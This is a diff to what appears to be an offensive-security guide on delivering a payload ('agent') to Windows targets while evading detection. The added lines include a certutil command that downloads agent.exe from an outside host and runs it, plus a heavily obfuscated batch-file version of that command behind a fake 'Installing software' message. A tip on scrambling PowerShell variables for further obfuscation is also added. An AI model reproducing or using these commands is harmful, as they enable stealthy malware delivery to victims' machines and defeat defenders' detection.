@@ -182,8 +182,13 @@ The above string can be obfuscated using the **batch special character: "** <br 
 ---
 
       TODO: [ certutil ] aditional download/execute remote method
+      Sometimes we need to use non-conventional methods to deliver our agent to target
+      system and bypass detection, in this situation certutil can be an ussefull method.
 
 <br />
+
+- String command to obfuscate<br />
+`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.69/agent.exe agent.exe && start agent.exe`<br />
 
       1º - Store your agent.exe into your apache webroot (linux)
       cp agent.exe /var/www/html/agent.exe
@@ -199,8 +204,9 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - File **certutil.bat** to be executed in target system
 
       @echo off
+      sEt e=!h&& sEt c=db&& a=0x
       echo [+] Please Wait, Installing software ..
-      cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.69/agent.exe %TEMP%\\agent.exe && start %TEMP%\\agent.exe
+      ;%d^b%M%A%d"."eX%!h% /%db% @%db%e"r"Tu%C%tIl.%!h%^xe -uR%A%l%db%%0x%ch%!h% -sP%F%l^It -f ht%D%tp://192.168.1.69/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%K%T %0x%"g"%!h%Nt.e%H%x%!h%
       exit
 
 ![batch obfuscation certutil.bat](http://i.)
@@ -569,6 +575,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 `$a=("{3}{0}{2}{1}{4}" -f'voke','es','-Expr','In','sion') ; $r=("{0}{2}{1}" -f'(New','ject)','-Ob'))`
 
 ![powershell obfuscation](http://i.cubeupload.com/1QWXPY.jpg)
+`HINT: we can also scramble the location of vars to obfuscate further eg: r$ ; a$ ; etc`
 
 ---
 
@@ -587,7 +594,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
       TODO: [ BitsTransfer ]
       Another way to download/execute remotelly our agent without using the powershell switch
-      (Net.WebClient).DownloadString method. This method also allow us to chose the download
+      (Net.WebClient).DownloadFile method. This method also allow us to chose the download
       location of the agent in target system and start the agent (exe).
 
 <br />
